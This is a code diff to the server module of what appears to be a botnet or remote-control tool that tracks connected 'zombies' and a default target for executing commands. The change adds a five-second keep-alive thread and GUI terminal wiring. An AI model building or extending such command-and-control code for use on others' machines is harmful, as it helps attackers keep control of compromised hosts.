@@ -19,14 +19,14 @@ serverLogger = Logger(file_name='server')
 terminalLogger = Logger(file_name='terminal')
 
 class ServerModule:
-    def __init__(self, lip, lport, is_from_gui, zombies_gui_tab=None):
+    def __init__(self, lip, lport, is_from_gui, terminal_window_box=None, zombies_gui_tab=None):
         self.listening_ip = lip
         self.listening_port = lport
         self.connection_status = 0
         self.zombies_addresses_and_communicators_list = [] # storing clients sockets and their ips [ip:port,communicator,{'os_info':'(OS Info)'}] # hello_back sent
         self.zombies_addresses_and_communicators_list_temp = [] # hello_back message from zombies didn't send yet
         self.default_target = None # this var saves default target for executing commands when -h option is not used
-        self.terminal_window_box = None
+        self.terminal_window_box = terminal_window_box
         self.zombies_gui_tab = zombies_gui_tab
         self.is_from_gui = is_from_gui
 
@@ -96,6 +96,23 @@ class ServerModule:
 
         Thread(target=self.send_hello_signal,
                args=(zombie_default_communicator, (ip,port),)).start()  # send hello signal
+
+        Thread(target=self.send_server_signal, args=(zombie_default_communicator,)).start()
+
+    def send_server_signal(self, communicator):
+        '''
+        send signal to clients every 5 secs
+        '''
+        while True:
+            sleep(5)
+            temp_list = []  # temp list to store communicators of zombies
+            for zc in self.zombies_addresses_and_communicators_list:
+                temp_list.append(zc[1])
+
+            if communicator not in temp_list: # break loop if zombie has removed
+                break
+
+            communicator.send_server_signal()
 
     def send_hello_signal(self, default_communicator, client_conn_tuple):
         zombie_sent_hello_back = default_communicator.send_hello_signal()
@@ -177,7 +194,7 @@ class ServerModule:
         for temp_z in self.zombies_addresses_and_communicators_list:
             if z_address == temp_z[0]:
                 self.zombies_addresses_and_communicators_list.remove(temp_z)
-                terminalLogger.log(text=f'Connection with {z_address} closed!')
+                self.push_text_in_terminal_box(text=f'Connection with {z_address} closed!')
                 break
 
     def stop_server(self):
